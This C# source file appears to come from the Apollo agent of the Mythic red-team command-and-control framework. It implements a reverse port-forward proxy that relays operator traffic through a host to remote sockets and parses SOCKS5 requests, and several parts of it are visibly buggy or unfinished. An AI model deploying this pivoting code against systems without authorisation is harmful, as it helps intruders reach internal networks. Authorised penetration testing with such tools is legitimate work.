using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.RPortFwdProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;
using Apollo.SocksProxy.Enums;
using Apollo.SocksProxy.Structs;

namespace Apollo.RPortFwdProxy.Classes
{
    public class ProxyConnection
    {

        public string MythicPort;
        public string RemotePort;
        public string RemoteIp;


        //public Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>> messages_back = new Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>>();
        public Dictionary<string, Thread> operatorReadQueue = new Dictionary<string, Thread>();
        public Dictionary<string, Queue> operatorMapQueue = new Dictionary<string, Queue>();
        public Dictionary<string, Socket> operatorMapConn = new Dictionary<string, Socket>();
        public Dictionary<String, List<String>> messages_back = new Dictionary<String, List<String>>();

        public static Thread operatorDispatchDatagram;

        public int locker = 0;

        private static Random rnd = new Random();

        private Queue requestData = new Queue();
        private Queue syncRequestData;

        private Queue responseData = new Queue();
        private Queue syncResponseData;

        private bool exited = false;
        public int ServerID { get; private set; }
        public Socket ClientConnection { get; private set; } = null;
        public AddrSpec Bind { get; private set; } = new AddrSpec();

        private Thread WriteThread = null;
        private Thread ReadThread = null;

        private readonly ManualResetEvent exitEvent = new ManualResetEvent(false);

        public delegate void DisconnectEvent(int serverID);
        public DisconnectEvent OnDisconnect { get; private set; }



        public string IPAddress { get; private set; } = "";
        private static int MESSAGE_SIZE = 512000;

        public const int ConnectCommand = 1;
        public const int NoAuth = 0;
        public const int socks5Version = 5;
        private static System.Net.IPAddress localhostIPAddr = System.Net.IPAddress.Parse("127.0.0.1");

        public ProxyConnection(string port, string rport, string rip)
        {
            MythicPort = port;
            RemotePort = rport;
            RemoteIp = rport;

            operatorDispatchDatagram = new Thread(() => DispatchToOperators());
            operatorDispatchDatagram.Start();
        }

        public string GetConfs()
        {
            return "Local Port: " + MythicPort + ", Remote Port: " + RemotePort + ", Remote IP" + RemoteIp;
        }

        public void StopForward()
        {
            foreach (KeyValuePair<string, Queue> entry in operatorMapQueue)
            {
                lock (operatorReadQueue)
                {
                    operatorReadQueue[entry.Key].Abort();
                }
                lock (operatorMapConn)
                {
                    operatorMapConn[entry.Key].Close();
                }
                lock (operatorMapQueue)
                {
                    operatorMapQueue[entry.Key].Clear();
                }
            }
        }

        private void DispatchToOperators()
        {

            foreach (KeyValuePair<string, Queue> entry in operatorMapQueue)
            {
                if (operatorMapConn.ContainsKey(entry.Key) == false)
                {
                    Socket new_operatorconn = initConn();
                    operatorMapConn[entry.Key] = new_operatorconn;
                    Thread thread = new Thread(() => ReadFromTarget(entry.Key));
                    operatorReadQueue[entry.Key] = thread;
                    operatorReadQueue[entry.Key].Start();
                }

                if (entry.Value.Count > 0)
                {
                    lock (operatorMapQueue)
                    {
                        string base64data = (string)operatorMapQueue[entry.Key].Dequeue();
                        byte[] data = Convert.FromBase64String(base64data);
                        operatorMapConn[entry.Key].Send(data);
                    }
                }

            }
            // keep reading from operatorMapQueue and send to operatorMapConn

        }

        public void AddDatagramToQueueProx(Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>> msgs)
        {
            //KeyValuePair<string, ProxyConnection> entry
            foreach (KeyValuePair<String, Dictionary<String, Dictionary<String, List<String>>>> rport_dict in msgs)
            {
                foreach(KeyValuePair<String, Dictionary<String, List<String>>> rip_dict in rport_dict.Value)
                {
                    foreach(KeyValuePair<String, List<String>> entry in rip_dict.Value)
                    {
                        string operatorId = entry.Key;
                        lock (operatorMapQueue)
                        {
                            foreach (string base64data in entry.Value)
                            {
                                operatorMapQueue[entry.Key].Enqueue(base64data);
                            }
                        }
                    }
                }
            }
        }

        // TODO
        public Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>>GetMessagesBack()
        {
            while (locker == 1)
            {
                System.Threading.Thread.Sleep(1);
            }
            locker = 1;
            Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>> temp_dict1 = new Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>>();
            Dictionary<String, Dictionary<String, List<String>>> temp_dict3 = new Dictionary<String, Dictionary<String, List<String>>>();
            Dictionary<String, List<String>> temp_dict2 = new Dictionary<String, List<String>>();

            foreach (KeyValuePair<string, Socket> entry in operatorMapConn)
            {
                string operatorId = entry.Key;
                temp_dict2[operatorId] = messages_back[entry.Key];
            }
            temp_dict3[RemoteIp] = temp_dict2;
            temp_dict1[RemotePort] = temp_dict3;
            messages_back = new Dictionary<String, List<String>>();
            locker = 0;
            return temp_dict1;
        }

        public void ReadFromTarget(string oper)
        { 
            byte[] data = new byte[8192];
            int size_data = operatorMapConn[oper].Receive(data);
            byte[] trimmed_data = data.Take(size_data).ToArray();
            string data_Base64 = Convert.ToBase64String(trimmed_data);
            if (messages_back.ContainsKey(oper) == false)
            {
                    List<String> message_list = new List<String>();
                    messages_back[oper] = message_list;
            }
            messages_back[oper].Add(data_Base64);

        }

        public Socket initConn()
        {
            IPEndPoint remoteEPC2 = new IPEndPoint(System.Net.IPAddress.Parse(RemoteIp), Convert.ToInt32(RemotePort));
            Socket socketOperator = new Socket(System.Net.IPAddress.Parse(RemoteIp).AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            socketOperator.Connect(remoteEPC2);
            return socketOperator;
        }

        private Request ParseAddrSpec(byte[] data)
        {
            int dataIndex = 0;
            int headerIndex = 0;
            byte[] header = new byte[3];
            byte[] address = null;
            IPAddress targetIP = null;
            int targetPort;
            AddrSpec addrSpec = new AddrSpec() { FQDN = "", IP = null, Port = -1 };
            SocksError errorResponse;
            if (data.Length <= 1)
            {
                throw new SocksException("Datagram was an invalid length.", SocksError.InvalidDatagram);
            }
            if (data.Length < 3)
            {
                throw new SocksException("Datagram was an invalid length.", SocksError.InvalidDatagram);
            }

            Array.Copy(data, header, 3);
            dataIndex += 3;
            // gonna assume this means fail to read header
            if (header[0] != socks5Version)
            {
                throw new SocksException($"Got header frame requesting invalid SOCKS version {header[0]}.", SocksError.CommandNotSupported);
            }
            AddressType ipType = (AddressType)data[dataIndex];
            dataIndex += 1;
            switch (ipType)
            {
                case AddressType.IPv4Address:
                    address = new byte[4];
                    Array.Copy(data, dataIndex, address, 0, 4);
                    targetIP = new IPAddress(address);
                    dataIndex += 4;
                    addrSpec = new AddrSpec()
                    {
                        FQDN = "",
                        IP = targetIP
                    };
                    break;
                case AddressType.IPV6Address:
                    address = new byte[16];
                    Array.Copy(data, dataIndex, address, 0, 16);
                    targetIP = new IPAddress(address);
                    dataIndex += 16;
                    addrSpec = new AddrSpec()
                    {
                        FQDN = "",
                        IP = targetIP,
                    };
                    break;
                case AddressType.FQDNAddress:
                    int addrLength = data[dataIndex];
                    dataIndex += 1;
                    byte[] fqdnBytes = new byte[addrLength];
                    Array.Copy(data, dataIndex, fqdnBytes, 0, addrLength);
                    dataIndex += addrLength;
                    string fqdn = Encoding.UTF8.GetString(fqdnBytes);
                    try
                    {
                        var ipEntry = Dns.GetHostEntry(fqdn);
                        if (ipEntry.AddressList.Length == 0)
                            break;
                        foreach (var ipaddr in ipEntry.AddressList)
                        {
                            if (ipaddr.ToString().Contains("."))
                            {
                                targetIP = ipaddr;
                                break;
                            }
                        }
                        if (targetIP == null)
                            targetIP = ipEntry.AddressList[0];
                        addrSpec = new AddrSpec()
                        {
                            FQDN = fqdn,
                            IP = targetIP
                        };
                        break;
                    }
                    catch (Exception ex)
                    {
                        //DebugWriteLine($"Error while resolving FQDN: {ex.Message}");
                        //if (ByteSequenceEquals(data, new byte[] { 5, 1, 0, 5}) || ByteSequenceEquals(data, new byte[] { 5,2,0,2}))
                        //{
                        //    var msg = new SocksDatagram()
                        //    {
                        //        server_id = conn.ServerID,
                        //        data = Convert.ToBase64String(new byte[] { 5, 0 })
                        //    };
                        //    AddMythicMessageToQueue(msg);
                        //}
                        //new Thread(() => RemoveProxyConnection(conn)).Start();
                        break;
                    }
                default:
                    //DebugWriteLine("AddrType was not IPv4, IPv6, or FQDN!");
                    //if (ByteSequenceEquals(data, new byte[] { 5, 1, 0, 5 }) || ByteSequenceEquals(data, new byte[] { 5, 2, 0, 2 }))
                    //{
                    //    var msg = new SocksDatagram()
                    //    {
                    //        server_id = conn.ServerID,
                    //        data = Convert.ToBase64String(new byte[] { 5, 0 })
                    //    };
                    //    AddMythicMessageToQueue(msg);
                    //}
                    //new Thread(() => RemoveProxyConnection(conn)).Start();
                    break;
            }
            if (targetIP == null)
            {
                throw new SocksException(SocksError.AddrTypeNotSupported);
            }
            if (data.Length < (dataIndex + 2))
            {
                throw new SocksException(SocksError.ServerFailure);
            }

            byte[] portBytes = new byte[2];
            Array.Copy(data, dataIndex, portBytes, 0, 2);
            dataIndex += 2;
            targetPort = ((int)portBytes[0] << 8) | (int)portBytes[1];
            addrSpec.Port = targetPort;

            Request request = new Request()
            {
                Version = socks5Version,
                Command = header[1],
                DestAddr = addrSpec,
                //BufCon = conn
            };
            int clientPort = rnd.Next(60000, 65536);
            AddrSpec clientAddr = new AddrSpec()
            {
                FQDN = "",
                IP = System.Net.IPAddress.Parse("127.0.0.1"),
                Port = clientPort
            };

            request.RemoteAddr = clientAddr;
            IPAddress destIPAddr;
            if (request.DestAddr.FQDN != "")
            {
                if (request.DestAddr.IP == null)
                {
                    //DebugWriteLine("About to resolve FQDN");
                    var dnsEntry = Dns.GetHostEntry(request.DestAddr.FQDN);
                    if (dnsEntry.AddressList.Length == 0)
                    {
                        throw new SocksException(SocksError.HostUnreachable);
                    }
                    request.DestAddr.IP = dnsEntry.AddressList[0];

                }
            }

            return request;
        }

        private bool DispatchRequest(Request request)
        {
            bool bRet = false;
            switch (request.Command)
            {
                case ConnectCommand:
                    var bind = new AddrSpec();
                    int bindPort = rnd.Next(65000, 65536);
                    IPEndPoint localEndpoint = new IPEndPoint(localhostIPAddr, bindPort);
                    bind.FQDN = "";
                    bind.IP = localhostIPAddr;
                    bind.Port = bindPort;
                    Socket target;
                    try
                    {
                        if (request.DestAddr.IP.AddressFamily == AddressFamily.InterNetwork)
                            target = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        else
                            target = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
                    }
                    catch (Exception ex)
                    {
                        throw new SocksException("Failed to create socket for address.", SocksError.ConnectionRefused);
                    }
                    //target.Bind(localEndpoint);

                    //TcpClient target = new TcpClient(localEndpoint);
                    try
                    {
                        target.Connect(request.DestAddr.IP.ToString(), request.DestAddr.Port);
                    }
                    catch (Exception ex)
                    {
                        throw new SocksException($"Failed on client connect to {request.DestAddr.IP.ToString()}", SocksError.HostUnreachable, ex);
                    }
                    bRet = true;
                    //DebugWriteLine($"Successfully connected to {request.DestAddr.IP.ToString()}");
                    ClientConnection = target;
                    Bind = bind;
                    //var msgToSend = CreateFormattedMessageWithLength(SocksError.SuccessReply, bind, conn);
                    //AddMythicMessageToQueue(msgToSend);
                    //new Thread(() => conn.StartRelay()).Start();
                    break;
                default:
                    throw new SocksException($"Command not supported: {request.Command}", SocksError.CommandNotSupported);
            }
            return bRet;
        }


        public bool EnqueueRequestData(byte[] data)
        {
            //DebugWriteLine($"{IPAddress} ({ServerID}) attempting to enqueue request data...");
            syncRequestData.Enqueue(data);
            //DebugWriteLine($"{IPAddress} ({ServerID}) request data successfully enqueued!");
            return true;
        }

        public byte[] GetRequestData()
        {
            byte[] data;
            while (!exited)
            {
                if (syncRequestData.Count > 0)
                {
                    data = (byte[])syncRequestData.Dequeue();
                    return data;
                }
            }
            return null;
        }

        public void Close()
        {
            // Something called close twice, so let's just wait for the other thread to finish.
            if (exited)
                exitEvent.WaitOne();
            // Initialize close sequence
            else
            {
                exited = true;
                //if (ReadThread != null && WriteThread != null)
                //{
                //    if (ReadThread.IsAlive || WriteThread.IsAlive)
                //    {
                //        ReadThread.Join();
                //        WriteThread.Join();
                //    }
                //}
                // Kill the socket.
                if (ClientConnection != null)
                {
                    try
                    {
                        ClientConnection.Close();
                    }
                    catch (Exception ex)
                    {
                        //DebugWriteLine($"Error closing socket to {IPAddress}: {ex.Message}");
                    }
                }
                // Remove everything.
                OnDisconnect(this.ServerID);
                // Notify other callers you can terminate.
                exitEvent.Set();
            }
        }

        public bool EnqueueResponseData(byte[] data)
        {
            //DebugWriteLine($"{IPAddress} ({ServerID}) attempting to enqueue response data...");
            syncResponseData.Enqueue(data);
            //DebugWriteLine($"{IPAddress} ({ServerID}) response data successfully enqueued!");
            return true;
        }


    }
}
